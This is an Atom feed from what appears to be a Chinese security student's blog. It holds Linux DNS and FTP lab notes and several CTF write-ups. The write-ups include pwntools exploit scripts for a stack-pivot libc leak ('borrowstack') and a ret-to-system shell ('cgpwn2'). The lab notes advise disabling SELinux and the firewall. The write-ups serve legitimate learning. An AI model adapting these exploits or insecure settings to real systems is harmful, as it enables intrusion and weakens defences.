    <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>全称： domain name system<br><img src="http://qiqianyun.chumen77.xyz/uPic/lHjkck.png" srcset="/img/loading.gif" alt></p><h2 id="域名服务基础"><a href="#域名服务基础" class="headerlink" title="域名服务基础"></a>域名服务基础</h2><h3 id="DNS作用及类型"><a href="#DNS作用及类型" class="headerlink" title="DNS作用及类型"></a>DNS作用及类型</h3><h4 id="DNS-系统的作用-："><a href="#DNS-系统的作用-：" class="headerlink" title="DNS 系统的作用 ："></a>DNS 系统的作用 ：</h4><ul><li>正向解析：根据主机名称（域名）查找对应的 IP 地址（最常见）</li><li>反向解析：根据 IP 地址查找对应的主机域名（通信行业常用）</li></ul><h4 id="DNS-系统的工作模式："><a href="#DNS-系统的工作模式：" class="headerlink" title="DNS 系统的工作模式："></a>DNS 系统的工作模式：</h4><ul><li>递归查询 ：访问必须有一次一回，会返回成功或者失败。</li><li>迭代查询 ：多次访问，多次返回，必须返回一个正确的地址。<h4 id="域名结构："><a href="#域名结构：" class="headerlink" title="域名结构："></a>域名结构：</h4><img src="http://qiqianyun.chumen77.xyz/uPic/KgLSqJ.png" srcset="/img/loading.gif" alt><br>全世界有13台根域名服务器。<h4 id="BIND软件服务"><a href="#BIND软件服务" class="headerlink" title="BIND软件服务"></a>BIND软件服务</h4></li></ul><pre><code class="html">服务名：named 端口号：53主配置文件：/etc/named.conf保存 DNS 解析记录的数据文件位于：/var/named/</code></pre><h4 id="主配置文件部分参数："><a href="#主配置文件部分参数：" class="headerlink" title="主配置文件部分参数："></a>主配置文件部分参数：</h4><pre><code class="html">listen-on port 53 { 127.0.0.1; }; //要填入自己主机iplisten-on-v6 port 53 { ::1; }; allow-query     { any; };//意思是给任何网段进行解析</code></pre><p>分别是: ipv4监听端口和ip地址，默认只有本地的<br>  ipv6的监听端口和ip地址</p><pre><code class="html">recursion yes;             // 递归还是迭代查询dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto;</code></pre><p>这个是dns控制防止欺骗用户。但是因为其加上了包的验证，再传给服务器时候，服务器进行拆包验证，会增加服务器的负荷，所以用的不多。</p><h4 id="区域文件部分参数："><a href="#区域文件部分参数：" class="headerlink" title="区域文件部分参数："></a>区域文件部分参数：</h4><pre><code class="html">    zone &quot;baidu.com&quot; IN {      type master;      file &quot;baidu.localhost&quot;; //本机记录文件名称（可以diy）      allow-update { none; };       };     //正向    zone &quot;131.140.168.192.in-addr.arpa&quot; IN {               type master;               file &quot;baidu.empty&quot;;              allow-update { none; };      };    //反向//对于其中 file 自定义的名字，要与数据配置文件里面名字相同。</code></pre><h2 id="实验搭建过程"><a href="#实验搭建过程" class="headerlink" title="实验搭建过程"></a>实验搭建过程</h2><p>要求：www主机解析为172.16.10.5；ftp主机解析为172.16.10.6：mail主机解析为172.16.10.8：DNS主机解析为本机IP172.16.10.9；添加泛解析记录；同时添加www的别名记录ns1</p><h3 id="服务器主机"><a href="#服务器主机" class="headerlink" title="服务器主机"></a>服务器主机</h3><h4 id="关闭防火墙、SELinux"><a href="#关闭防火墙、SELinux" class="headerlink" title="关闭防火墙、SELinux"></a>关闭防火墙、SELinux</h4><pre><code class="html">vi /etc/selinux/config</code></pre><p>把改成 SELINUX = disabled 然后<code>setenforce 0</code></p><p><code>systemctl stop firewalld.service</code> 关闭防火墙。</p><h4 id="配置主配置文件："><a href="#配置主配置文件：" class="headerlink" title="配置主配置文件："></a>配置主配置文件：</h4><pre><code class="html">vi /etc/named.conf</code></pre><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/sgXisx.png" srcset="/img/loading.gif" alt><br>注意分号不要忘记，ip填的是本机地址。</p><h4 id="配置区域文件"><a href="#配置区域文件" class="headerlink" title="配置区域文件"></a>配置区域文件</h4><pre><code class="html">vi /etc/named.rfc1912.zones</code></pre><pre><code class="html">zone &quot;chumen77.com&quot; IN {        type master;        file &quot;chumen77.localhost&quot;;        allow-update { none; };};zone &quot;10.16.172.in-addr.arpa&quot; IN {        type master;        file &quot;chumen77.loopback&quot;;        allow-update { none; };};</code></pre><ul><li>其中注意反向解析时，ip地址的反写，还有写到ip地址第三个段。</li><li>并且正向解析和反向解析的文件名字要给记住，一会需要去按名称配置的。</li></ul><h4 id="配置正向反向解析数据文件"><a href="#配置正向反向解析数据文件" class="headerlink" title="配置正向反向解析数据文件"></a>配置正向反向解析数据文件</h4><pre><code class="html">cp -p /var/named/named.localhost /var/named/chumen77.localhostcp -p /var/named/named.empty /var/named/chumen77.loopback</code></pre><ul><li>-p 是用来复制文件的权限情况。</li><li>来拷贝一下，方便直接修改。</li></ul><p>正向解析文件 ：</p><pre><code class="html">$TTL 1D@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.www     IN      A       172.16.10.5ftp     IN      A       172.16.10.6mail    IN      A       172.16.10.8dns     IN      A       172.16.10.131ns1     IN      CNAME   www*       IN      A       172.16.10.10</code></pre><p>反向解析文件：</p><pre><code class="html">$TTL 3H@       IN SOA  chumen77.com. rname.invalid. (                                        0       ; serial                                        1D      ; refresh                                        1H      ; retry                                        1W      ; expire                                        3H )    ; minimum        NS      dns.chumen77.com.5       PTR     www.chumen77.com.6       PTR     ftp.chumen77.com.8       PTR     mail.chumen77.com.131     PTR     dns.chumen77.com.*       PTR     xxx.chumen77.com.</code></pre><p>注意每个网址后面要加个点。</p><h4 id="检查和开启"><a href="#检查和开启" class="headerlink" title="检查和开启"></a>检查和开启</h4><p><code>named-checkzone</code> 可以对上面4个配置文件进行语法问题的检查，出现ok就是没什么问题了。</p><pre><code class="html">systemctl start named</code></pre><p>开启服务，如果出现无法开启，有异常：</p><pre><code class="html">cat /var/log/messages </code></pre><p>用这个命令去查那个配置文件里面的内容填错了，然后改一下就ok了。</p><h3 id="客户机设置"><a href="#客户机设置" class="headerlink" title="客户机设置"></a>客户机设置</h3><h4 id="网卡设置"><a href="#网卡设置" class="headerlink" title="网卡设置"></a>网卡设置</h4><pre><code class="html">vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></pre><p>修改网卡信息 ：</p><pre><code class="html">DNS1=192.168.140.131</code></pre><p>要在最后加上你dns服务器的ip。注意是 <code>DNS1</code>. 设置好后重启网卡。</p><pre><code class="html">service network restart</code></pre><h4 id="测速是否成功"><a href="#测速是否成功" class="headerlink" title="测速是否成功"></a>测速是否成功</h4><p>使用一下 <code>nslookup</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/MaK7Sw.png" srcset="/img/loading.gif" alt></p><p>正向反向都成功了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNS&quot;&gt;&lt;a href=&quot;#DNS&quot; class=&quot;headerlink&quot; title=&quot;DNS&quot;&gt;&lt;/a&gt;DNS&lt;/h1&gt;&lt;p&gt;全称： domain name system&lt;br&gt;&lt;img src=&quot;http://qiqianyun.chumen77.xyz/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux\_ftp服务搭建踩坑记录</title>
    <link href="http://chumen77.xyz/2020/03/11/linux_ftp%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/03/11/linux_ftp服务搭建简单记录/</id>
    <published>2020-03-11T05:46:50.000Z</published>
    <updated>2020-03-28T03:59:37.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux-ftp服务搭建简单记录"><a href="#linux-ftp服务搭建简单记录" class="headerlink" title="linux_ftp服务搭建简单记录_"></a>linux_ftp服务搭建简单记录_</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单记录一下，ftp的相关需要记录的知识跟搭建所踩的坑。</p><h2 id="两种服务模式"><a href="#两种服务模式" class="headerlink" title="两种服务模式"></a>两种服务模式</h2><ul><li>主动模式：FTP服务器主动向客户端发起连接请求。</li><li>被动模式：FTP服务器等待客户端发起连接请求（FTP的默认工作模式）。<h2 id="vsftpd服务程序"><a href="#vsftpd服务程序" class="headerlink" title="vsftpd服务程序"></a>vsftpd服务程序</h2>ftp是Linux系统中以命令行界面的方式来管理FTP传输服务的客户端工具。我们首先手动安装这个ftp客户端工具，以便在后续实验中查看结果。<br>vsftpd作为更加安全的文件传输的服务程序，允许用户以<strong>三种认证模式</strong>登录到FTP服务器上。</li><li><strong>匿名开放模式</strong>：是一种最不安全的认证模式，任何人都可以无需密码验证而直接登录到FTP服务器。</li><li><strong>本地用户模式</strong>：是通过<strong>Linux系统本地的账户密码</strong>信息进行认证的模式，相较于匿名开放模式更安全，而且配置起来也很简单。但是如果被黑客破解了账户的信息，就可以畅通无阻地登录FTP服务器，从而完全控制整台服务器。</li><li><strong>虚拟用户模式</strong>：是这三种模式中最安全的一种认证模式，它需要为FTP服务单独建立用户数据库文件，虚拟出用来进行口令验证的账户信息，而这些账户信息在服务器系统中实际上是不存在的，仅供FTP服务程序进行认证使用。这样，即使黑客破解了账户信息也无法登录服务器，从而有效降低了破坏范围和影响。<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code class="html">yum -y install vsftpd</code></pre></li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>主配置文件路径 ：</p><pre><code class="html">/etc/vsftpd/vsftpd.conf</code></pre><p>常用的配置参数以及作用如下：</p><pre><code class="html">参数                                作用listen=[YES|NO]              是否以独立运行的方式监听服务listen_address=IP地址        设置要监听的IP地址listen_port=21               设置FTP服务的监听端口download_enable＝[YES|NO]    是否允许下载文件userlist_enable=[YES|NO]     设置用户列表为“允许”还是“禁止”操作userlist_deny=[YES|NO]      设置用户列表为“允许”还是“禁止”操作max_clients=0                最大客户端连接数，0为不限制max_per_ip=0                 同一IP地址的最大连接数，0为不限制anonymous_enable=[YES|NO]    是否允许匿名用户访问anon_upload_enable=[YES|NO]  是否允许匿名用户上传文件anon_umask=022               匿名用户上传文件的umask值anon_root=/var/ftp           匿名用户的FTP根目录anon_mkdir_write_enable=[YES|NO]    是否允许匿名用户创建目录anon_other_write_enable=[YES|NO]    是否开放匿名用户的其他写入权限（包括重命名、删除等操作权限）anon_max_rate=0               匿名用户的最大传输速率（字节/秒），0为不限制local_enable=[YES|NO]         是否允许本地用户登录FTPlocal_umask=022                本地用户上传文件的umask值local_root=/var/ftp            本地用户的FTP根目录chroot_local_user=[YES|NO]    是否将用户权限禁锢在FTP目录，以确保安全local_max_rate=0              本地用户最大传输速率（字节/秒），0为不限制</code></pre><p>在配置着的时候，注意对在这里对应起来，来控制匿名模式跟本地用户的部分权限。</p><h3 id="开启vsftpd服务"><a href="#开启vsftpd服务" class="headerlink" title="开启vsftpd服务"></a>开启vsftpd服务</h3><pre><code class="html">service vsftpd start  systemctl start vsftpd</code></pre><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="0x1-："><a href="#0x1-：" class="headerlink" title="0x1 ："></a>0x1 ：</h3><p>因为是实验机，随便折腾，为了实验的成功，需要<strong>关闭防火墙</strong> 和<strong>SELinux服务</strong>。</p><h4 id="防火墙："><a href="#防火墙：" class="headerlink" title="防火墙："></a>防火墙：</h4><p>CentOS7.0版本的linux系统的防火墙是firewalld，其他版本的可能是iptables。<br>firewalld防火墙关闭代码：</p><pre><code class="html">关闭防火墙systemctl stop firewalld.service永久禁止防火墙 systemctl disable firewalld.service检查防火墙状态 systemctl status firewalld.service提示：Active: inactive (dead)就表示关闭了。</code></pre><p>iptables防火墙关闭代码 ：</p><pre><code class="html">查询防火墙状态    :    service  iptables status停止防火墙   :        service   iptables stop启动防火墙   :        service   iptables start重启防火墙   :        service   iptables restart永久关闭防火墙    :     chkconfig   iptables off永久关闭后启用    :   chkconfig   iptables on</code></pre><h4 id="SELinux服务："><a href="#SELinux服务：" class="headerlink" title="SELinux服务："></a>SELinux服务：</h4><p><code>setsebool -P ftpd_full_access=on</code>单独处理ftpd。</p><p>或：关闭SELinux</p><pre><code class="html">$ vi /etc/selinux/config</code></pre><p>将 SELINUX=XXX –&gt;XXX 代表级别<br>改为** SELINUX=disabled**<br>然后重启系统，或者执行命令：<code>setenforce 0</code>。</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2:"></a>0x2:</h3><p>发现匿名用户，在连上ftp服务器时候，无法进行写入东西。</p><pre><code class="html">550 Permission denied.</code></pre><p>然后这个目录是:</p><pre><code class="html">/var/ftp/pub</code></pre><p>这就是把这个pub的属主控制为 控制为ftp即可。</p><pre><code class="html">chown ftp pub</code></pre><p>这样就可以了。</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3:"></a>0x3:</h3><p>在本地用户的时候，用root也是无法连接ftp服务的。这是因为vsftpd服务程序所在的目录中默认存放着两个名为“用户名单”的文件（<code>ftpusers和user_list</code>）把ftpusers这里面的root去掉即可。</p><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4:"></a>0x4:</h3><ul><li>在采用本地用户模式登录FTP服务器后，默认访问的是该用户的家目录，也就是说，访问的是/home/linuxprobe目录(系统创建的用户，在home文件夹下都有对应用户名的文件夹)。而且该目录的默认所有者、所属组都是该用户自己，因此不存在写入权限不足的情况。如果读写权限没给，手动设定，给读写权限。</li><li>采用非本地用户模式登录，与采用本地用户模式的区别是：采用非本地用户模式<strong>可以指定FTP文件夹</strong>。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;linux-ftp服务搭建简单记录&quot;&gt;&lt;a href=&quot;#linux-ftp服务搭建简单记录&quot; class=&quot;headerlink&quot; title=&quot;linux_ftp服务搭建简单记录_&quot;&gt;&lt;/a&gt;linux_ftp服务搭建简单记录_&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;
      
    
    </summary>
    
    
      <category term="linux" scheme="http://chumen77.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>安恒抗疫赛</title>
    <link href="http://chumen77.xyz/2020/02/29/%E5%AE%89%E6%81%92%E6%8A%97%E7%96%AB%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/02/29/安恒抗疫赛/</id>
    <published>2020-02-29T04:12:59.000Z</published>
    <updated>2020-03-12T15:11:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安恒抗疫赛"><a href="#安恒抗疫赛" class="headerlink" title="安恒抗疫赛"></a>安恒抗疫赛</h1><p>很简单的比赛，题也不多，记录一下做的2道简单的Re。</p><h2 id="re1-pyc"><a href="#re1-pyc" class="headerlink" title="re1_pyc"></a>re1_pyc</h2><p>拿到的是一个pyc文件。直接拿到网站上反编译一下：</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import base64import stringdef caser(flag):    enc1 = &#39;&#39;    for i in flag:        enc1 += chr(ord(i) - 5)    return enc1def rail(flag):    p1 = &#39;&#39;    p2 = &#39;&#39;    p3 = &#39;&#39;    enc2 = &#39;&#39;    for i in range(len(flag)):        j = i % 3        if j == 0:            p1 += flag[i]            continue        if j == 1:            p2 += flag[i]            continue        p3 += flag[i]    enc2 = p1 + p2 + p3    return enc2def rep(flag):    table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;    table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;    table = string.maketrans(table1, table2)    return flag.translate(table, &#39;=&#39;)while True:    flag = raw_input(&#39;please input flag to check:&#39;)    if rep(base64.b64encode(rail(caser(flag)))) == &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;:        print &#39;Success!you got it!&#39;        break        continue    print &#39;try a gain&#39;</code></pre><p>逻辑挺简单的，直接拿着这个代码改下：</p><pre><code class="python">#!/usr/bin/env python# encoding: utf-8import base64import stringdef caser(flag):    enc1 = &#39;&#39;    for i in flag:        enc1 += chr(ord(i) + 5)    return enc1def rail(flag):    p1 = &#39;&#39;    p2 = &#39;&#39;    p3 = &#39;&#39;    enc2 = &#39;&#39;    j = 0    x = 25    for i in range(x):        j = i + 13        z = j + 13        p3 += flag[i] + flag[j]         if z &gt;= 38 :            break        p3 += flag[z]    enc2 = p1 + p2 + p3    return enc2def rep(flag):    table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;    table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;    table = string.maketrans(table1, table2)    return flag.translate(table, &#39;=&#39;)key = &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;flag = rail(caser(base64.b64decode(rep(key) + &#39;=&#39;)))print(flag)</code></pre><h2 id="maze1"><a href="#maze1" class="headerlink" title="maze1"></a>maze1</h2><p>一个简单的maze问题，不过是c++写的，ida反编译看起来有点难读。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/03LBOC.png" srcset="/img/loading.gif" alt><br>从这里确定下地图，后面的2就是终点。去内存中取出来地图：<br><img src="http://qiqianyun.chumen77.xyz/uPic/x7t4PS.png" srcset="/img/loading.gif" alt><br>去ida继续分析：<br><img src="http://qiqianyun.chumen77.xyz/uPic/S2wojN.png" srcset="/img/loading.gif" alt><br>发现你输入的字符串需要等于10，如果不是直接就失败，长度等于10才继续判断。awsd还是这几个字符控制方向。再联系一下前面的地图，终点是2，只能走10步，猜一波dddddsssss。<br><img src="http://qiqianyun.chumen77.xyz/uPic/3qNEI0.png" srcset="/img/loading.gif" alt><br>就是这个，flag就是去md5加密一下出来的字符串。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒抗疫赛&quot;&gt;&lt;a href=&quot;#安恒抗疫赛&quot; class=&quot;headerlink&quot; title=&quot;安恒抗疫赛&quot;&gt;&lt;/a&gt;安恒抗疫赛&lt;/h1&gt;&lt;p&gt;很简单的比赛，题也不多，记录一下做的2道简单的Re。&lt;/p&gt;
&lt;h2 id=&quot;re1-pyc&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>记录i春秋新春公益赛的两个题</title>
    <link href="http://chumen77.xyz/2020/02/25/%E8%AE%B0%E5%BD%95i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/02/25/记录i春秋新春公益赛的两个题/</id>
    <published>2020-02-25T08:55:25.000Z</published>
    <updated>2020-03-12T15:12:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记录i春秋新春公益赛的两个题"><a href="#记录i春秋新春公益赛的两个题" class="headerlink" title="记录i春秋新春公益赛的两个题"></a>记录i春秋新春公益赛的两个题</h1><h2 id="吃鸡神器"><a href="#吃鸡神器" class="headerlink" title="吃鸡神器"></a>吃鸡神器</h2><p>这个题目是比赛时没做，因为有一段时间没做re题目了，下来看到这个题做出的人不算少，就去尝试做一做。<br>源程序是qt写的，以前听室友说过qt的程序ida是静态分析不了的，函数调用太多了，就直接动态分析。这个题目应该是有多线程od打开直接是黑屏的，左下角显示新建了一个线程，第一次做这种题也比较没有头绪。折腾了一会发现用的<strong>x64dbg</strong>可以调试了。</p><h3 id="x64dbg调试"><a href="#x64dbg调试" class="headerlink" title="x64dbg调试"></a>x64dbg调试</h3><p>一直运行程序等代码跑到0x40开头的段，进入login 的模块。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aQ0jsg.png" srcset="/img/loading.gif" alt><br>找下字符串：<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/AL01Oy.png" srcset="/img/loading.gif" alt><br>在这里下个断点。因为登陆失败会跳转输出这个字符串的函数，看看能不能查看出是从哪里跳转过来的然后在密码判断那里来继续分析。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Ior8oA.png" srcset="/img/loading.gif" alt><br>看到已经跳转过来了，但是发现附近没有什么判断的地方，去根据那个从哪里跳转过来，追过去看到登陆成功调用welcome的函数，但是也没有发现什么可以利用的那里的判断不是要找的密码判断。<br>换个思路，还是跳转到失败那里，但是在<strong>上层函数</strong>的栈中，因为存在判断登陆的用户跟密码，应该会存在我们输入的东西，寻找一下密码跟用户名。<br><img src="http://qiqianyun.chumen77.xyz/uPic/ExvIk2.png" srcset="/img/loading.gif" alt><br>找到了，给用户名对应的地址下一个硬件断点，来看看哪里会访问这里，只要访问了基本距离要找的函数差不远了。其中第二个字符对应处，经测试不应该下断点。一直让其F9运行，等到了用户0x40段代码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/guzN1A.png" srcset="/img/loading.gif" alt><br>发现这段是在一个个字符处理<strong>lubenwei</strong>字符串，还有<code>ret</code>，这样基本就是了。ret以后到：<br><img src="http://qiqianyun.chumen77.xyz/uPic/nTZ8tn.png" srcset="/img/loading.gif" alt><br>注意此处的汇编语句，并看下寄存器情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bua46M.png" srcset="/img/loading.gif" alt><br>刚刚走过call函数，下面且有cmp对比语句，并且发现了输入的密码<code>12345678</code>，十分可疑了。<br>在这几处函数下断点，重新点击login验证进行分析，发现的确断在了下的这几个函数，结合寄存器查看发现，输入的密码跟走过<code>0x004021D3</code>这个函数后传过来的eax进行对比。并且一对比以后就进入了，提示登陆失败的地方。所以这个eax就是用户的密码了。<br>测试以后发现是小写的<code>eax  41D26F00</code> ：41d26f00,输入密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/psY0ix.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r3WZrp.png" srcset="/img/loading.gif" alt><br>Ok,成功了。</p><h2 id="borrowstack"><a href="#borrowstack" class="headerlink" title="borrowstack"></a>borrowstack</h2><p>这个题目名字就是borrowshack 接栈。含义就是转移栈，正好最近刚学过，就动手去做了，结果卡了很久，但也学到很多，此前练习的栈迁移题目没有这题的情况。</p><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code class="objc">[*] &#39;/media/psf/mypwn2/xcgys/borrowstack&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [rsp+0h] [rbp-60h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  puts(&amp;s);  read(0, &amp;buf, 0x70uLL);  puts(&quot;Done!You can check and use your borrow stack now!&quot;);  read(0, &amp;bank, 0x100uLL);  return 0;}</code></pre><p>代码是很简单的，bank的地址在bss段，以后留着做栈迁移就可以了 。溢出地址还是只可以控制ebp，跟retadress。接下来就是自己学到的了，自己手动调试了一段时间才发现的。</p><h4 id="坑点（学到的新东西）"><a href="#坑点（学到的新东西）" class="headerlink" title="坑点（学到的新东西）"></a>坑点（学到的新东西）</h4><p>先说下这个程序的情况：<br>bank 的地址 <code>.bss:0000000000601080</code><br><img src="http://qiqianyun.chumen77.xyz/uPic/Q3hjpz.png" srcset="/img/loading.gif" alt><br>注意看下bss段里got段的距离，一共是40个字节，是比较近的。如果按我以前的做法直接迁移到bank这地址做新栈，当栈迁移过去以后，使用puts函数来泄露某个函数got对应的地址时，会发现当调用puts以后，会进入libc中开始一连串的函数调用：第一个<br><img src="http://qiqianyun.chumen77.xyz/uPic/2Zk09z.png" srcset="/img/loading.gif" alt><br>发现还没有push，此时rsp就是bank的地址了，push过后肯定栈指针开始慢慢变小，往bss段上方延伸。<br>当调用第二个函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/v02DA7.png" srcset="/img/loading.gif" alt><br>发现已经到了bss上方的got表段，这样毫无疑问，里面的值就会改动了，程序接下来发生什么是很难预测的，并且个人也拿不到原本的got地址，从而算出libc基地址。并且会发现，当以往回到start处清理栈想再次利用漏洞的时候，也是不行了，也是因为不知道什么数据被改动，造成了影响。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><p>就是把栈迁移到bss段的尽量靠后，这样就会尽量不影响到got表和原本正常的数据。返回地址不再是自己常常用的start处，换成其他合适的地方。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./borrowstack&#39;)# io = remote(&#39;123.56.85.29&#39;,3635)elf = ELF(&#39;./borrowstack&#39;)# libc = elf.libcleave_addr = 0x0400699offset = 200buf_addr = 0x000601080padding = 0x60start_addr = 0x0400626p = &#39;\x00&#39;* padding + p64(buf_addr+offset) + p64(leave_addr)pop_rsi_rx_ret = 0x400701 io.recvuntil(&#39;want\n&#39;)raw_input(&#39;-&gt;&#39;)io.send(p)io.recvuntil(&#39;stack now!\n&#39;)libc_start_main =  elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]puts_got = elf.got[&#39;puts&#39;]pop_rdi_ret = 0x400703read_got = elf.got[&#39;read&#39;]p = flat([&#39;b&#39;*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr])raw_input(&#39;-&gt;&#39;)io.sendline(p)puts_add = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))print(hex(puts_add))obj = LibcSearcher(&#39;puts&#39;,puts_add)libc_base = puts_add - obj.dump(&#39;puts&#39;)print(hex(libc_base))sleep(0.1)rec = libc_base + 0x4526asystem_addr = libc_base + libc_basebinsh_addr = libc_base + libc_baseprint(hex(system_addr))print(hex(binsh_addr))io.recvline()io.recvuntil(&#39;want\n&#39;)p = &#39;\x00&#39;* padding + p64(1) + p64(rec)io.send(p)io.interactive()</code></pre><h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3><p>结论：当栈迁移到bss段以后，由于libc函数的调用，此时栈慢慢增高，bss段以上的数据也可能会被改动。<br>收获：当再遇到栈迁移问题的时候，要注意bss段与got的距离，返回地址写入start地址，发现出现问题的时候，就该提升栈迁移的地址高度，和找个合适的返回位置，再次利用漏洞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;记录i春秋新春公益赛的两个题&quot;&gt;&lt;a href=&quot;#记录i春秋新春公益赛的两个题&quot; class=&quot;headerlink&quot; title=&quot;记录i春秋新春公益赛的两个题&quot;&gt;&lt;/a&gt;记录i春秋新春公益赛的两个题&lt;/h1&gt;&lt;h2 id=&quot;吃鸡神器&quot;&gt;&lt;a href=&quot;#吃
      
    
    </summary>
    
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>XCTF\_pwn新手</title>
    <link href="http://chumen77.xyz/2020/02/17/XCTF_pwn%E6%96%B0%E6%89%8B/"/>
    <id>http://chumen77.xyz/2020/02/17/XCTF_pwn新手/</id>
    <published>2020-02-17T12:42:23.000Z</published>
    <updated>2020-02-28T09:12:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-pwn新手"><a href="#XCTF-pwn新手" class="headerlink" title="XCTF_pwn新手"></a>XCTF_pwn新手</h1><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><pre><code class="objc">    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/17/XCTF_pwn新手/images/15819436335898.jpg" srcset="/img/loading.gif" alt="-w605"><br>漏洞就在这s处，gets可以无限读取，导致栈溢出。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>第一个fgets获取时候，读取一个<code>/bin/sh\x00</code>进去，因为name的地址是固定的。</li><li>get函数获取时候，padding + system_plt +name地址即可。</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./cgpwn2&#39;)io = remote(&#39;111.198.29.45&#39;,40540)elf = ELF(&#39;./cgpwn2&#39;)io.recvuntil(&#39;name\n&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(&#39;/bin/sh\x00&#39;)system_plt = elf.symbols[&#39;system&#39;]padding = 0x26 + 4binsh_add = 0x0804A080payload = padding * &#39;a&#39; + p32(system_plt) + p32(0x0804A080) + p32(binsh_add)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF-pwn新手&quot;&gt;&lt;a href=&quot;#XCTF-pwn新手&quot; class=&quot;headerlink&quot; title=&quot;XCTF_pwn新手&quot;&gt;&lt;/a&gt;XCTF_pwn新手&lt;/h1&gt;&lt;h2 id=&quot;cgpwn2&quot;&gt;&lt;a href=&quot;#cgpwn2&quot; class=&quot;
      
    
    </summary>
    
    
